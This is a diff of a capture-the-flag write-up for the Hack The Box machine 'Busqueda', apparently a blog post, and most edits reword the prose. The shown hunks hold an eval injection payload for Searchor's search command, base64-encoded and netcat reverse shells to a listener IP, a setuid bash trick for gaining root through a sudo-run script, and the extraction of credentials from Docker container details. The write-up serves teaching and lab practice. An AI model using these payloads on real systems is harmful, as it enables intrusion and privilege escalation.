@@ -8,7 +8,7 @@ description: Busqueda was an easy difficulty Linux box, which features a website
 lang: en
 ---
 
-![Active](/assets/img/posts/htb-busqueda/Busqueda.png){: .center }
+![Busqueda](/assets/img/posts/htb-busqueda/Busqueda.png){: .center }
 _Busqueda Machine info card_
 
 #### Machine info table
@@ -169,7 +169,7 @@ _Amazon search results_
 
 ## TA0008: Lateral Movement
 
-### CVE-2023-43364 
+### CVE-2023-43364
 #### Arbitrary Code Injection Vulnerability in Searchor CLI's Search
 
 If you look at [this page](https://github.com/ArjunSharda/Searchor/security/advisories/GHSA-66m2-493m-crh2), we can understand what is the vulnerability we are dealing with here.
@@ -185,7 +185,7 @@ But we are dealing with the Searchor version 2.4.0, we need to abuse this vulner
 
 #### Testing locally
 
-Let's find out exactly how to work with Arbitrary Code Injection. I am using python virtual environment to test this package.
+Let's find out exactly how to work this Arbitrary Code Injection. I am using python virtual environment to test this package.
 
 ```bash
 0hmsec@kali:-$ python3 -m venv myenv
@@ -235,9 +235,9 @@ Options:
   --help      Show this message and exit.
 ```
 
-From the github pull request page, we can see that the vulnerability was present in the `search` CLI command.
+From the [github pull request page](https://github.com/ArjunSharda/Searchor/pull/130), we can see that the vulnerability was present in the `search` CLI command.
 
-For the vulnerability to work, we need to abuse this function.
+For the vulnerability to work, we need to abuse the below function.
 
 ```python
 url = eval(
@@ -247,9 +247,10 @@ url = eval(
 
 To check the code execution:
 1. we need a valid linux command written in proper python syntax
-2. we need to find in which of the two arguments "ENGINE" or "QUERY", the linux command should be passed.
+2. the searchor command takes two options "ENGINE" and "QUERY". We need to find in which of these two, the arbitrary linux command needs to be passed.
 
 #### Payload Explanation
+
 After a bit of googling and trial & error, we find the python syntax to be this.
 
 ```python
@@ -259,7 +260,7 @@ After a bit of googling and trial & error, we find the python syntax to be this.
 - `__import__('os')`: Dynamically imports the os module, which provides functions for interacting with the operating system.
 - `.popen('whoami')`: Executes the shell command "whoami"
 - `.read()`: Reads the output of the command execution
-- `'` and `+`: Added at the start and end for correct syntax of the F-string
+- `'` and `+`: Added at the start and end for achieving the correct syntax of the F-string.
 
 #### Local Code Execution
 
@@ -324,11 +325,13 @@ While trying to pass this in the payload, it is better to base64 encode it.
 0hmsec@kali:-$ echo -ne "bash -c 'bash -i >& /dev/tcp/KALI_IP/PORT 0>&1'" | base64
 ```
 
+The final payload.
+
 ```python
 ' + __import__('os').popen('echo {BASE64_ENCODED_CODE}|base64 -d|bash -i').read() + '
 ```
 
-Before passing the payload, we need to have our nc listener running. Then we can directly pass the payload in the " What do you want to search for: " on the site - http://searcher.htb/.
+Before passing the payload, we need to have our "nc" listener running. Then we directly pass the payload in the "What do you want to search for: " field on the site - http://searcher.htb/.
 
 ![RCE](/assets/img/posts/htb-busqueda/ss7.png){: .center }
 _RCE_
@@ -386,10 +389,12 @@ svc@busqueda:~$ cat user.txt
 
 Thus, we have found our `user.txt` flag.
 
+---
+
 ## TA0006: Credential Access
 ### T1552.001: Credentials in Files
 
-When enumerating around, we find `.git` folder in the `/var/www/app` directory.
+When enumerating around, we find `.git` folder in the `/var/www/app` directory. Inside the ".git" directory, we find a `config` file.
 
 ```bash
 svc@busqueda:/var/www/app/.git$ cat config
@@ -430,7 +435,7 @@ Here, we find:
 ## TA0004: Privilege Escalation
 ### T1548.003: Sudo and Sudo Caching
 
-Going back to terminal and checking the user's sudo privileges.
+Since there are no other important information, let's go back to the terminal and check the user's sudo privileges.
 
 ```bash
 svc@busqueda:/var/www/app$ sudo -l
@@ -451,7 +456,7 @@ svc@busqueda:/var/www/app$ ls -l /opt/scripts/system-checkup.py
 -rwx--x--x 1 root root 1903 Dec 24  2022 /opt/scripts/system-checkup.py
 ```
 
-Due to the file's privileges we can't be able to read the script. But with sudo privileges provided, we can try to execute it.
+Due to the file's privileges we can't be able to read the script. But the user svc can be able to execute it that too with sudo privileges.
 
 Since `*` is given at the end of the command, an argument has to be provided. Or else, the command won't be executed. And, we can't be able to run the command without `sudo`, which is obvious.
 
@@ -463,7 +468,7 @@ svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py
 Sorry, user svc is not allowed to execute '/usr/bin/python3 /opt/scripts/system-checkup.py' as root on busqueda.
 ```
 
-But with a random word like "blah", the command got executed and shows us the usage of the command.
+With a random word like "blah", the command got executed and shows us the usage of the command.
 
 ```bash
 svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py blah
@@ -494,17 +499,19 @@ svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py 
 Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
 ```
 
-"docker-inspect" needs a format and a "container name". When we check the [document](https://docs.docker.com/engine/cli/formatting/) about `--format` argument of the "docker inspect" command, we find that `{% raw %}{{json .}}{% endraw %}` shows all contents in json. Also, we need to use the `jq` command to see structured json output.
+"docker-inspect" needs two options, a "format" and a "container_name". When we check the [document](https://docs.docker.com/engine/cli/formatting/) about `--format` argument of the "docker inspect" command, we find that `{% raw %}{{json .}}{% endraw %}` shows all contents in json. Also, we need to use the `jq` command to see the json output in a structured format.
 
 ```bash
 svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{% raw %}{{json .}}{% endraw %}' gitea | jq .
 ```
 
-This command gave information that we know about. We are able to access the gitea instance via gitea.searcher.htb. So, let's try with "mysql_db".
+This option "gitea" gave information that we already know about. We are able to access the gitea instance via gitea.searcher.htb. So, let's try with "mysql_db".
 
 ```bash
 svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{% raw %}{{json .}}{% endraw %}' mysql_db | jq .
 ```
+
+Before we see the details about the output, let's find out what happens with the last option, "full-checkup" as well.
 
 ##### full-checkup
 
@@ -513,10 +520,12 @@ svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py 
 Something went wrong
 ```
 
+It straight away throws an error. Let's get back to this option after we collect more information.
+
 ### TA0006: Credential Access
 #### T1552.001: Credentials in Files
 
-We actually get a long output and the two important information that we need can be obtained by using the selectors `{% raw %}{{json .Config}}{% endraw %}` and `{% raw %}{{json .NetworkSettings}}{% endraw %}`.
+When we ran the "docker-inspect" command with `{% raw %}{{json .}}{% endraw %}`, it showed all the contents. Out of that, the two most important information that we need can be obtained by using the selectors `{% raw %}{{json .Config}}{% endraw %}` and `{% raw %}{{json .NetworkSettings}}{% endraw %}`.
 
 ```bash
 svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{% raw %}{{json .Config}}{% endraw %}' mysql_db | jq .
@@ -555,8 +564,6 @@ As you can see from the outputs, we got:
 1. IP address of the docker container running the mysql instance
 2. Credentials of the mysql database.
 
-`full-checkup` straight away throws an error.
-
 ##### Connecting to the mysql database
 
 ```bash
@@ -577,7 +584,7 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 mysql> 
 ```
 
-And we are in. Now let's exploirng the database and find if there is any useful information.
+And we are in. Now let's explore the database and find if there is any useful information.
 
 ```bash
 mysql> show databases;
@@ -636,7 +643,7 @@ We already know cody's password. Before we try to crack the administrator's pass
 ![administrator](/assets/img/posts/htb-busqueda/ss11.png){: .center }
 _Gitea login_
 
-And we are in.
+And we are in. If we look around, we can find the source code of `system-checkup.py`.
 
 ```python
 ---[snip]---
@@ -651,15 +658,15 @@ And we are in.
 ---[snip]---
 ```
 
-Also, we can find the source code of `system-checkup.py`. While analysing the code, we find an if statement for the `full-checkup` option. We can understand that it tries to run the script named `full-checkup.sh` from the current directory. From the error "Something went wrong", it is also understandable that the python script cannot find "full-checkup.sh".
+While analysing the code, we find an if statement for the `full-checkup` option. We can understand that it tries to run the script named `full-checkup.sh` from the current directory. From the error "Something went wrong", it is also understandable that while we ran the python script earlier, it wasn't able to find "full-checkup.sh".
 
 ### Shell as root
 
-So, we can create our own `full-checkup.sh` and put in any bash code that we want to get executed. There are two ways to get a root shell.
+So, we can create our own `full-checkup.sh` in the current working directory, put in any bash code and then run the `system-checkup.py` python script. Now, there are two ways to get a root shell.
 
 #### Method-1: netcat Reverse shell
 
-The easiest way would be to start a netcat listener and catch the reverse shell.
+The easiest way would be to start a netcat listener and catch the reverse shell, which uses the below code.
 
 ```bash
 svc@busqueda:/tmp$ echo -ne '#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.10.14.21/8888 0>&1' > full-checkup.sh
@@ -687,7 +694,7 @@ While googling around I came across [this](https://0xdf.gitlab.io/2022/05/31/set
 svc@busqueda:/tmp$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/temp_bash\nchmod 4777 /tmp/temp_bash' > full-checkup.sh
 ```
 
-We are writting a script which will copy the `/bin/bash` file to a temporary file `/tmp/temp_bash` and also gives this temporary file full permission including the setuid bit. Thus, by running `/tmp/temp_bash`, we will be given a root shell.
+Here, we are writting a script which will copy the `/bin/bash` to a temporary file `/tmp/temp_bash` and also gives this temporary file full permission including the setuid bit. Thus, by running `/tmp/temp_bash`, we will be given a root shell.
 
 ```bash
 svc@busqueda:/tmp$ chmod +x full-checkup.sh 
